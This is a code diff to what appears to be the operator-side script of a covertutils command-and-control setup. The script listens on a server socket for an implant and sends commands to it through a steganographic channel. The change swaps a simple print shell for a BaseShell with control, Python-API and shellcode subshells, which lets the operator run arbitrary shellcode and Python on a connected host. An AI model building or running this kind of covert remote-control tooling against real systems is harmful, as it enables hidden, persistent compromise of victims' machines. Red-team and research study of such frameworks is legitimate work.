@@ -11,7 +11,9 @@
 from covertutils.handlers import ResponseOnlyHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
-from covertutils.shells import PrintShell
+
+from covertutils.shells.baseshell import BaseShell
+from covertutils.shells.subshells import SimpleSubShell, ShellcodeSubShell, PythonAPISubShell
 
 from time import sleep
 from os import urandom
@@ -131,7 +133,7 @@ server_socket.listen(5)			# independently of covertutils
 
 
 client = None						# Globally define the client socket
-
+client_addr = None
 def recv () :
 	global client
 	while not client : continue	# Wait until there is a client
@@ -162,6 +164,7 @@ handler = MyHandler( recv, send, orch )	# Instantiate the Handler Object using t
 
 def serveForever() :
 	global client
+	global client_addr
 	while True :				# Make it listen `hard`
 		client_new, client_addr = server_socket.accept()
 		client = client_new
@@ -174,8 +177,10 @@ server_thread.start()
 
 
 #============================== Shell Design part ========================
-shell = PrintShell( handler,
-	ignore_messages = set(['X']) )	# It is also the default argument in BaseShell
+shell = BaseShell(handler,
+	subshells = {'control' : SimpleSubShell, 'python' : PythonAPISubShell, 'main' : (SimpleSubShell, {'prompt_templ':'()[{stream}]> '} ), 'shellcode' : ShellcodeSubShell } ,
+	ignore_messages = set(['X']) 	# It is also the default argument in BaseShell
+	)
 shell.start()
 
 #==========================================================================
